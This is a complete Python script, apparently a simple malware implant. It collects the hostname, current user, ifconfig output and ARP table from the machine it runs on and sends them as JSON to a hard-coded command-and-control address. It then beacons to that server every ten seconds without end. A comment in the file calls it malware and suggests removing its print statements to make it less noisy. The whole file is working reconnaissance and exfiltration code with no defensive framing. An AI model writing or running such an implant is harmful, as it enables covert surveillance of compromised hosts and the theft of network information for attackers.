#!/usr/bin/python3
import json
import subprocess
import socket
import time

C2C_HOST = "192.168.0.1"
C2C_PORT = 4000

C2C_COMMUNICATION_INTERVAL_S = 10

host_info = {
    "hostname": "",
    "whoami": "",
    "ifconfig": "",
    "arp": "",
}


def get_host_info() -> None:
    """
    Populates the host_info dictionary with the hostname,
    current user (whoami), network configuration (ifconfig),
    and ARP table (arp -a). Handles potential FileNotFoundError for ARP.
    """
    host_info["hostname"] = subprocess.run(
        ["hostname"],
        capture_output=True,
        text=True
    ).stdout.strip()

    host_info["whoami"] = subprocess.run(
        ["whoami"],
        capture_output=True,
        text=True
    ).stdout.strip()

    host_info["ifconfig"] = subprocess.run(
        ["ifconfig"],
        capture_output=True,
        text=True
    ).stdout.strip()

    try:
        host_info["arp"] = subprocess.run(
            ["arp", "-a"],
            capture_output=True,
            text=True
        ).stdout.strip()
    except FileNotFoundError:
        host_info["arp"] = ""  # Handle case where ARP command is not found


def ping_c2c() -> None:
    """
    Sends a ping message to the C2C server with the hostname.
    The message format is "hostname ping".
    """
    message = host_info["hostname"] + " ping"
    send_message_to_c2c(message.encode("utf-8"))


def send_message_to_c2c(message: bytes) -> None:
    """
    Sends a message to the C2C server.
    Tries to connect to the server and send the message.
    Handles ConnectionRefusedError gracefully.
    """
    try:
        s = socket.socket()
        s.connect((C2C_HOST, C2C_PORT))
        s.send(message)
    except ConnectionRefusedError:
        # Consider removing these prints to make the malware less noisy
        print("Connection refused, will retry later.")
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        s.close()


def main() -> None:
    """
    Main function that collects host information and sends it to the C2C
    server. Continuously sends ping messages to the C2C server at regular
    intervals.
    """
    get_host_info()
    send_message_to_c2c(json.dumps(host_info).encode("utf-8"))

    while True:
        ping_c2c()
        time.sleep(C2C_COMMUNICATION_INTERVAL_S)


if __name__ == "__main__":
    main()
